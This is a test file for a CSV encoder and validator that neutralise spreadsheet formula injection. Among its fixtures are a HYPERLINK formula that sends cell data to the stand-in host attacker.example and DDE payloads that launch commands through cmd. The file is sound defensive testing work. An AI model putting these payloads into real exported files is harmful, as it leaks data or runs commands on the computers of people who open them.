// Tests for spreadsheet-safe CSV cells (OWASP CSV Injection, CWE-1236).
//
// A CSV cell whose text starts a formula is evaluated when the file is opened
// in Excel, LibreOffice or Google Sheets, even when RFC 4180 quoting keeps it in
// its own cell. The encoder neutralizes such text with a leading `'`; genuine
// numbers, including PostgreSQL `numeric` values that arrive as decimal strings,
// must still open as the same number.

import { describe, expect, it } from 'vitest'
import { csvCell, isFormulaSafeCsv } from './csv-cell'

const HYPERLINK = '=HYPERLINK("https://attacker.example/leak?d="&A2&A3,"Open")'

describe('csvCell', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+1+1', "'+1+1"],
    ['-2+3', "'-2+3"],
    ['@SUM(A1:A2)', "'@SUM(A1:A2)"],
    ['\t=1', "'\t=1"],
    ["=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"],
    // Numeric-looking at the start is not a number: the whole text decides.
    ["-1+cmd|' /C calc'!A0", "'-1+cmd|' /C calc'!A0"],
    ['-3 stars', "'-3 stars"],
    ['-Infinity', "'-Infinity"],
  ])('neutralizes formula-leading text %j', (value, cell) => {
    expect(csvCell(value)).toBe(cell)
  })

  it('quotes a neutralized cell that also needs RFC 4180 quoting', () => {
    expect(csvCell(HYPERLINK)).toBe(
      '"\'=HYPERLINK(""https://attacker.example/leak?d=""&A2&A3,""Open"")"',
    )
    expect(csvCell('\r=1')).toBe('"\'\r=1"')
  })

  it.each([
    ['-3.0000000000', '-3.0000000000'],
    ['-3', '-3'],
    ['+1', '+1'],
    ['4.5', '4.5'],
    ['-.5', '-.5'],
    ['1e-7', '1e-7'],
    [-3, '-3'],
    [-1.5e-7, '-1.5e-7'],
    [0, '0'],
    [4.5, '4.5'],
  ])('leaves the genuine number %j intact', (value, cell) => {
    expect(csvCell(value)).toBe(cell)
  })

  it.each([
    'Gateway Program',
    '11111111-1111-4111-8111-111111111111',
    '2026-08-27T10:00:00.000000Z',
    "'=already text",
    'a - b',
  ])('keeps ordinary text %j byte-identical', (value) => {
    expect(csvCell(value)).toBe(value)
  })

  it('writes booleans as themselves', () => {
    expect(csvCell(true)).toBe('true')
    expect(csvCell(false)).toBe('false')
  })

  it('quotes separators, embedded quotes and line breaks', () => {
    expect(csvCell('Front Desk, Dana "D" Rivera')).toBe('"Front Desk, Dana ""D"" Rivera"')
    expect(csvCell('line\nbreak')).toBe('"line\nbreak"')
    expect(csvCell('a\r\nb')).toBe('"a\r\nb"')
  })

  it('renders null and undefined as an empty cell', () => {
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
    expect(csvCell('')).toBe('')
  })
})

describe('isFormulaSafeCsv', () => {
  it('accepts every document csvCell writes, hostile values included', () => {
    const values = [HYPERLINK, '=1+1', '\r=1', '\t@x', '-2+3', '-1.0000000000', null]
    const document = `${values.map((value) => csvCell(value)).join(',')}\n`

    expect(isFormulaSafeCsv(document)).toBe(true)
  })

  it('accepts negative numbers, empty cells and CRLF records', () => {
    expect(isFormulaSafeCsv('id,delta\nc-1,-1.0000000000\n')).toBe(true)
    expect(isFormulaSafeCsv('a,,b\r\n-3,+4.5,\r\n')).toBe(true)
    expect(isFormulaSafeCsv('')).toBe(true)
  })

  it.each([
    ['an unquoted formula cell', 'name\n=1+1\n'],
    ['a quoted formula cell', 'id,name\n1,"=HYPERLINK(""x"",""y"")"\n'],
    ['a formula in a later column', 'a,b\nx,@SUM(A1)\n'],
    ['a formula after a bare carriage return', 'a\r=1\n'],
    ['a formula on the last line without a newline', 'a\n-2+3'],
  ])('rejects %s', (_label, document) => {
    expect(isFormulaSafeCsv(document)).toBe(false)
  })

  it.each([
    ['an unterminated quote', 'a,"=1+1\n'],
    ['text after a closing quote', '"a"=1+1\n'],
    ['a quote inside an unquoted cell', 'a"b,c\n'],
  ])('rejects malformed quoting: %s', (_label, document) => {
    expect(isFormulaSafeCsv(document)).toBe(false)
  })
})
